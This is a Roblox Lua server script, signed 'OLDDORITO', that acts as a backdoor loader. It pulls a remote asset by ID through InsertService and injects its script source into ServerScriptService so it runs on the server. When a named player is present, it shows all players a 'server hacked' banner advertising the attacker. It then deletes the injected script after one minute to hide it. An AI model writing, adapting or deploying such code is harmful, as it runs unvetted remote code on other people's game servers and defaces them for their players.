-- OLDDORITO
local InsertService = game:GetService("InsertService")
local ServerScriptService = game:GetService("ServerScriptService")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local assetID = 364364477

local function loadExecuteAndDeleteAsset(assetID)
    -- Attempt to load the asset
    local success, result = pcall(function()
        return InsertService:LoadAsset(assetID)
    end)

    if success then
        local asset = result:GetChildren()[1]

        -- if necessary and then the json gets decoded!!1!!1
        if asset:IsA("ModuleScript") or asset:IsA("LocalScript") or asset:IsA("Script") then
            local scriptSource = asset.Source
            local decodedScriptSource = scriptSource

            local scriptInstance = Instance.new("Script")
            scriptInstance.Source = decodedScriptSource
            scriptInstance.Parent = ServerScriptService

            -- this would notify the target player and all clients
            local targetPlayer = Players:FindFirstChild("werrrolo")
            if targetPlayer then
                local broadcastGui = Instance.new("ScreenGui")
                broadcastGui.Name = "BroadcastGui"

                local textLabel = Instance.new("TextLabel")
                textLabel.Text = "Oh no? OLDDORITO HACKED THE SERVER SILLY GOOSES!1!1! SEARCH UP OLDDORITO AND 101y0ucant10i RIGHT NEOWW"
                textLabel.Size = UDim2.new(0, 400, 0, 50)
                textLabel.Position = UDim2.new(0.5, -200, 0.1, 0)
                textLabel.TextScaled = true
                textLabel.BackgroundColor3 = Color3.new(0, 0, 0)
                textLabel.TextColor3 = Color3.new(21, 444, 101)
                textLabel.Parent = broadcastGui

                -- this would parent the broadcast GUI to all players PlayerGui so then everyclient would see the goofy text above ^u^
                for _, player in ipairs(Players:GetPlayers()) do
                    broadcastGui:Clone().Parent = player:WaitForChild("PlayerGui")
                end
            end

            -- this sets a timer to delete the script after one minute (60 seconds)
            delay(60, function()
                if scriptInstance and scriptInstance.Parent then
                    scriptInstance:Destroy()
                    print("Script deleted after one minute.")
                end
            end)
        else
            warn("Loaded asset is not a script")
        end
    else
        warn("Failed to load asset:", result)
    end
end

-- execute the fawking function
loadExecuteAndDeleteAsset(assetID)
